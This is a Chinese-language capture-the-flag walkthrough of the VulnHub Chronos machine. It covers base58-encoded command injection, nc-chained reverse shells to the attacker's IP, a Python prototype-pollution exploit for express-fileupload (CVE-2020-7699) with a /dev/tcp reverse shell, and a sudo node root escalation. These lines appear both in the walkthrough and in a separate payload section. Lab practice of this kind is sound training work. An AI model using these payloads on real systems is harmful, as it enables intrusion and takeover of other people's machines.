# 相关信息

kali：10.0.0.7/24

靶机：10.0.0.5/24

靶机介绍：[Chronos: 1 ~ VulnHub](https://www.vulnhub.com/entry/chronos-1,735/)

靶机下载：https://download.vulnhub.com/chronos/Chronos.ova

难度：中（构思非常巧妙）

目标：两个 `flag`和拿下 `root`

# 文字思路

## 全流程思路

- 端口扫描	
- Web侦查：通过查看源码发现 `js`是非常重要的一步	
- 命令注入	数据编码解码	
- **搜索打法**	**框架漏洞利用**：这两部是非常考验你的检索能力的	
- 代码审计：该靶机的审计难度并不是很大，反而是通过代码的特征检索相关漏洞的难度较高
- NC串联	
- 本地提权：提权网站[GTFOBins](https://gtfobins.github.io/)

## 下意识的操作

- 有很多的靶机向端口，服务的开放通过外界的扫描是无法知道的。只有当进入靶机后才可能发现，有时候甚至需要上传脚本进行发现。

## 主要的知识点

- 能串联命令注入的符号有哪些
- nc串联
- 命令注入

## 感悟

1. 论信息收集的重要性？

    ​		在打靶的学习过程中，我也同样认识到信息的收集无论是在耗费的时间，还是重要性的占比上都是占据非常高的比例。很多时候只有你搜集到完备的信息的时候，你才有渗透的相关思路。同时你才能通过现有的信息，利用自己的经验和相关知识进一步推导出更多的渗透测试方案。

    ​		但是不得不承认的是，你信息收集是否全面，是否高效，你对信息的推导，是需要你大量的渗透积累，漏洞积累，系统积累等等一系列的总结和思考的。
    
2. 在打靶，看wp，看视频的过程中我们一定要多问我 `why`这个问题。一定，一定，一定！！！！

# 具体流程

## 信息搜集

1. 发现主机，端口扫描，具体端口服务和版本确认。在这里我们通过有一个新的工具 `netdiscover`来进行主机的发现。该工具和 `arping,arp-scan`本质的原理是一样的都是通过 `arp协议`来进行发现。在使用该工具的时候建议在扫描目标的时候，将目标所在的网段的 `netmask`减去 `8`个位，可以提高扫描效率。如：`netdiscover -r 10.0.0.0/16`。

    <img src="https://image.cchl.fun/kali_image/image-20230531161037165.png" alt="image-20230531161037165" style="zoom: 50%;" />

    重点关注 `8000`端口的 `http-alt,Node.js,Express framework`这几个重要扫描信息。

    [==什么是nodejs==](#tag3)<a id='back3'></a>               <a id='back1'></a>            [==什么是http-alt==](#tag1)

2. 我们访问该靶机开`80`端口上发布的网站，进入后页面就只有这几个字。那么查看网页源码就很有必要了。

    <img src="https://image.cchl.fun/kali_image/image-20230531161657472.png" alt="image-20230531161657472" style="zoom:50%;" />

    通过浏览网页源码，发现了个 `js`脚本。

    ![image-20230531161458603](https://image.cchl.fun/kali_image/image-20230531161458603.png)

    我们使用 `cyberchef.org`官网中的 `JavaScript Beautify`模块来帮助我们对该 `js`代码进行排版。当我们阅读的时候我们发现大量的代码我们是无法识别的（很有可能进行了相关的加密混淆），但与此同时当我们审计发现了个网址：`http://chronos.local:8000/date？format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`这个网站应该给予高度的重视，==既契合靶机的名字又契合8000端口这两个特征==。

    <img src="https://image.cchl.fun/kali_image/image-20230531162451881.png" alt="image-20230531162451881" style="zoom: 67%;" />

3. 通过上面的发现，如果想要通过该网站的域名进行成功访问的话，是需要修改 `/etc/hosts`文件的，添加 `127.0.0.1 chronos.local`解析记录，来进行本地的域名解析。

    <img src="https://image.cchl.fun/kali_image/image-20230531162743456.png" alt="image-20230531162743456" style="zoom:67%;" />

4. 进行 `burpsuite`来进行流量包的监控，当我们通过 `chronos.local`域名来访问的时候可以发现浏览器总共发起了 ==三次==请求，而且页面上也多出了一行关于系统时间的显示。

    （==注意：不要使用burpsuite内置的浏览器，会出问题==）

    <img src="https://image.cchl.fun/kali_image/image-20230531165401897.png" alt="image-20230531165401897" style="zoom:50%;" />

5. 查看第三个 `135`这个数据包可以发现一个参数`format=4ugYDuAkScCG5gMcZjEN3mALyG1dD5ZYsiCfWvQ2w9anYGyL`。明显这个参数进行过 ==编码或者加密== 的。我们再次的使用 `cyberchef`中的 `magic`模块，发现为一个这为一个 `base58`的编码。

    <img src="https://image.cchl.fun/kali_image/image-20230531165823713.png" alt="image-20230531165823713" style="zoom:67%;" />

    解码为：`'+Today is %A, %B %d, %Y %H:%M:%S.'`。如果熟悉 `linux`中的命令我们其实可以判断出这其实就是一个 `date`命令的格式化。用于对 `date`返还时间的格式化。`date '+Today is %A, %B %d, %Y %H:%M:%S.'`这就是相关的命令执行图片展示：

    <img src="https://image.cchl.fun/kali_image/image-20230531170015065.png" alt="image-20230531170015065" style="zoom:67%;" />

## 命令注入漏洞

​		这里我们暂停分析一下漏洞的产生原因：当我们通过域名访问靶机的时候，我们客户端会通过 `GET` 上载一个 `format`变量。靶机会自动的将 `format`的值和 `date`命令进行拼接，然后在 `shell`中执行将结果返回给客户端。

​		但由于我们是可以通过抓包来控制 `format`参数的，如果靶机没有对我们上载的数据进行相关的过滤，我们是否就可以进行命令的串联注入呢？<a id='back2'></a>				[==哪些命令的串联符号==](#tag2)

1. 我们进行相关的尝试，上载 payload为：`&&ls`，base58编码后为：`yZSGA`。可以发现返回的数据包成功的回弹。表明靶机是存在命令注入漏洞的。

    ![image-20230531170842874](https://image.cchl.fun/kali_image/image-20230531170842874.png)

2. 下一步就是进行突破边界返向连接了，payload为：`&&ls /bin ：VAZYW9RHPu6D`，在 `/bin`目录下我们发现了`nc`命令工具。然后再上载payload为：`&&nc 10.0.0.7 4444 ：2an39LDoLgxbVq62xMmgFHgNw  `，通过 `nc`我们发现成功的进行返向连接。

    <img src="https://image.cchl.fun/kali_image/image-20230531171327991.png" alt="image-20230531171327991" style="zoom: 67%;" />

3. 但上载`payload1`（==下面==）的时候，我们发现是无法进行成功的回连的。结合刚刚的成功连接，表明目标靶机的 `nc`是不具有 `-e`参数的。那么这个时候是需要使用nc串联技术的。上载 `payload2`，发现 `kali`打开的两个端口成功接收到相关回连。

    ```bash
    &&nc 10.0.0.7 4444 -e /bin/bash		# payload1
    ajvuL5RnJqominYdWfVq7sXXJMzRPKXkdjRLeJMtrK	# base58编码后的
    
    &&nc 10.0.0.7 4444 | /bin/bash | nc 10.0.0.7 5555	# payload2
    7BFuYVuCc4LN4GQ2dUC2xdLSAik2xH7EAE7B3xdJJuLW13wqYgZwXzfwvbXXSWv4a2p	## base58编码后的
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230531171841770.png" alt="image-20230531171841770" style="zoom:50%;" />

## 信息搜集

1. 发现我们为用户 `www-data`用户，查看第一个 `/hoem/imera/user.txt这个flag`的权限也是不够的，该 `flag` 只有 `imera`用户拥有读写的权限。我们查看系统内核的版本，虽然比较低但是我们也是没有什么可以利用的内核漏洞的。输入 `sudo -l`也是没有任何回显的。

    <img src="https://image.cchl.fun/kali_image/image-20230531172728817.png" alt="image-20230531172728817" style="zoom: 33%;" />

2. 同过上面的这个信息收集，我们查看 `/opt/chronos`这个目录下面的 `package.json`文件。可以明显的发现这个 `web`是引用了 `express,bs58`框架的（但是在网络上检索是没有能可以利用的相关漏洞）

    <img src="https://image.cchl.fun/kali_image/image-20230601153529533.png" alt="image-20230601153529533" style="zoom: 33%;" />

3. 然后再对同目录下的 `app.js`进行查看，一下为部分代码的展示和代码的审计。

    ```js
    // created by alienum for Penetration Testing
    const express = require('express');
    const { exec } = require("child_process");
    const bs58 = require('bs58'); // 这个模块就是用来解密我们上次的 format参数的
    const port = 8000;	// 契合我们nmap扫描到的8000端口
    
    app.get('/date', (req, res) => {
        var decoded = bytes.toString();	// 判断是user-agent是否为chronos,如果不是就会输出Permission Denied。网页的源码
        var concat = cmd.concat(decoded);//js会自动的设置该访问头，让我们正常访问。我们可以通过修改抓包来验证。
        if (agent === 'Chronos') {		
            if (concat.includes('id') || concat.includes('whoami') || concat.includes('python') || concat.includes('nc') || concat.includes('bash') || concat.includes('php') || concat.includes('which') || concat.includes('socat')) {
    //这是对我上次内容的过滤，但是非常的鸡肋。仅仅是判断是否有敏感词，但根本不做任何的过滤，服了
                res.send("Something went wrong");
            }
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230601154146858.png" alt="145" style="zoom: 67%;" />

4. 代码审计完后我们其实并没有太多可以提权的思路，自到我们到了 `/opt`目录下发现了另一个文件夹 `chronos-v2`。当我们进入够发现该文件夹的目录结构和 `chronos`目录几乎是一样的。同样访问查看`package.json,server.js`两个文件夹，并进行相关的代码审计。我们是可以发现一个文件上传的漏洞

     [CVE-2020-7699](https://nvd.nist.gov/vuln/detail/CVE-2020-7699)

    <img src="https://image.cchl.fun/kali_image/image-20230601190450144.png" alt="image-20230601190450144" style="zoom: 33%;" />

    部分代码的审计和注释

    ```js
    //package.json
      "main": "server.js",	// 主要的服务程序代码
        "ejs": "^3.1.5",	// ejs为一个js的模板引擎，也这个漏洞的必要条件之一
        "express": "^4.17.1",	// 印证了nodejs常用的框架是express框架
        "express-fileupload": "^1.1.7-alpha.3"}	//这个框架见名知意，应该是个文件上传的框架。后续发现也是我们需要利用的一个漏洞
    }
    
    //server.js
    app.use(fileupload({ parseNested: true }));	// 这个选项的开启至关重要，是我们利用漏洞的必开选项。阅读我分享的链接就可
    app.get('/', (req, res) => {	// 就可以看出文章明确的指出了漏洞的利用条件
       res.render('index')	// 一个路由部分
    });
    const server = http.Server(app);
    const addr = "127.0.0.1"	//这个服务是开在本地的8080端口，这也是我们为什么nmap的时候是无法发现8080端口的原因
    const port = 8080;
    ```

## 漏洞利用

下面的为漏洞的相关说明链接，非常非常建议阅读它，即使需要翻墙，即使是全英文的，非常非常建议。阅读这个blog可以发现该漏洞的利用有两个条件：1，ejs模板引擎。 2，express-fileupload版本老于1.1.9，同时开启了parseNested选项

[NodeJS module downloaded 7M times lets hackers inject code (bleepingcomputer.com)](https://www.bleepingcomputer.com/news/security/nodejs-module-downloaded-7m-times-lets-hackers-inject-code/)

1. 通过相关的搜寻我们是可以发现该漏洞的 `python`脚本，我们是通过 `nc串联`来进行反弹的 `shell`并不方便直接在靶机上写入 `payload`。我们还是通过 `python`的 `http`模块上载脚本到 靶机的`/temp`目录下。

    ![image-20230602150633843](https://image.cchl.fun/kali_image/image-20230602150633843.png)

    ```python
    import requests
    cmd = 'bash -c "bash -i &> /dev/tcp/10.0.0.7/4443 0>&1"'# 这里为kali的ip和端口
    # pollute，这里为靶机上服务开放的ip和开放服务的端口
    requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
        None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
    requests.get('http://127.0.0.1:8080')     # execute command，同样为靶机开放的ip和端口
    ```

2. 这个脚本会回连到我们 `kali`的4443端口，当脚本执行后我们会以 `imera`来控制靶机。这样我们就可以来读取第一个 `flag`了。

    ![image-20230602152519777](https://image.cchl.fun/kali_image/image-20230602152519777.png)

    ![image-20230602152604967](https://image.cchl.fun/kali_image/image-20230602152604967.png)

## 信息搜集

1. 同过我们进行常规的信息搜集后我们可以发现我们是可以通过 `root`来使用 `node`这个程序的，而我们知道如果 `node`拥有 `sudo`时，我们是可以提权为root用户的。

    ![image-20230602153427255](https://image.cchl.fun/kali_image/image-20230602153427255.png)

## 漏洞利用

1. 我是可以使用下面的payload来直接获取 `root`权限的。该命令可以通过[node | GTFOBins](https://gtfobins.github.io/gtfobins/node/)网站来查询。

    ![image-20230602153941268](https://image.cchl.fun/kali_image/image-20230602153941268.png)

    ```bash
    sudo node -e 'child_process.spawn("/bin/bash",{stdio:[0,1,2]})'
    ```

2. 获取第二个 `flag`:

    ![image-20230602154844828](https://image.cchl.fun/kali_image/image-20230602154844828.png)
    
    > 最后的最后获取的两个 `flag`是有彩蛋的     ˚₊‧꒰ა ☆ ໒꒱ ‧₊˚.，可以自己去解密的哇！！


# 相关工具/命令

## 命令

### date

1. what?

    用于返回系统当前时间的命令，可以对返回的结果进行格式化输出

2. 具体实例

    1. date '+Today is %A, %B %d, %Y %H:%M:%S.'

        返回格式为：Today is Thursday, June 02, 2023 07:42:56

## 工具

### netdiscover 

基于 ARP 协议（Address Resolution Protocol），发现主机。在实用工具的时候，最好是子网掩码减去8来进行扫描，提高效率。

2. 相关实例
    1. netdiscover -r 10.0.0.0/16
        - `-r <IP Range>`：指定要扫描的 IP 范围。

# 相关payload

### nodejs的express-fileupload

1. 利用条件

    - ejs模板引擎。 
    - express-fileupload版本老于1.1.9
    - 开启了parseNested选项

2. python代码,直接在靶机上执行。

    ```python
    import requests
    cmd = 'bash -c "bash -i &> /dev/tcp/10.0.0.7/4443 0>&1"'# 这里为kali的ip和端口
    # pollute，这里为靶机上服务开放的ip和开放服务的端口
    requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
        None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})
    requests.get('http://127.0.0.1:8080')     # execute command，同样为靶机开放的ip和端口
    ```

### node提权payload

1. 利用条件

    - 靶机上存在 `node`
    - 而且权限为 `sudo`

2. 直接在 `shell`中执行

    ```bash
    sudo node -e 'child_process.spawn("/bin/bash",{stdio:[0,1,2]})'
    ```

    在Node.js中，child_process.spawn()函数的第二个参数是一个对象，用于指定子进程的选项。其中，stdio选项用于指定子进程的stdin、stdout和stderr的配置。stdio:[0,1,2]表示将子进程的stdin、stdout和stderr分别连接到父进程的stdin、stdout和stderr。其中，0、1和2分别表示标准输入、标准输出和标准错误输出

# 复盘/相关知识

## 重要 

### 串联命令的符号

`A  符号  B`                                                               [==返回==](#back2)<a id='tag2'></a>

#### 管道符（|）

​		无论 `A`是否执行成功，都会执行 `B`命令。同时将 `A`的结果传递给 `B`。玩法丰富

#### 双管道符（||）

​		只有当前方的命令 `A`执行失败的时候才会执行后面的命令 `B`

#### &&

​		刚好和双管道符（||）功能相反。

### 什么是node.js?

1. what?                                                                            [==返回==](#back3)<a id='tag3'></a>

    Node.js 是一个基于 Chrome V8 JavaScript 引擎的开源、跨平台的 JavaScript 运行时环境。它允许开发人员使用 JavaScript 来构建服务器端应用程序。传统上，JavaScript 主要运行在浏览器中，用于前端开发，但是 Node.js 将 JavaScript 的能力扩展到了服务器端。同时还可以通过node.js开发其他非 `web`程序。

2. 渗透的注意事项

    1. node.js开发出来的web服务一般都会使用大量的框架，其中 `express`是最常见的开发框架。同时该开发框架下主目录下一般都有 `package.json`文件，里面定义了`web`大量的配置信息。

## 了解

### http-alt

1. what?                                                         [==返回==](#back1)<a id='tag1'></a>

    在Web中，"http-alt" 是指用于替代HTTP（默认端口为80）的备用端口号。

    
    
    
